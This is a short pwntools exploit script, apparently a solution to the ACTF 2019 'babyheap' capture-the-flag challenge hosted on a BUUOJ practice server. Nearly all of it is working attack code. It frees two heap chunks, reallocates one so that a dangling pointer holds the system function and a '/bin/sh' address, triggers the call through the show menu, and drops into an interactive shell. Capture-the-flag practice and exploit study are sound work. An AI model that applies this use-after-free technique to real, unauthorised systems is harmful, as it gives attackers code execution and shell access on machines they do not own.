from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./ACTF_2019_babyheap"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 28810)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, con):
    sa("Your choice: ", "1")
    sa("Please input size: \n", str(size))
    sa("Please input content: \n", con)

def free(index):
    sa("Your choice: ", "2")
    sa("Please input list index: \n", str(index))

def show(index):
    sa("Your choice: ", "3")
    sa("Please input list index: \n", str(index))


# uaf
 
pro = ELF("./ACTF_2019_babyheap")
system = pro.plt["system"]
binsh = 0x0602010 

add(0x20, "a")  # 0
add(0x20, "a")  # 1
free(0)
free(1)
add(0x10, p64(binsh)+p64(system))
show(0)

shell()


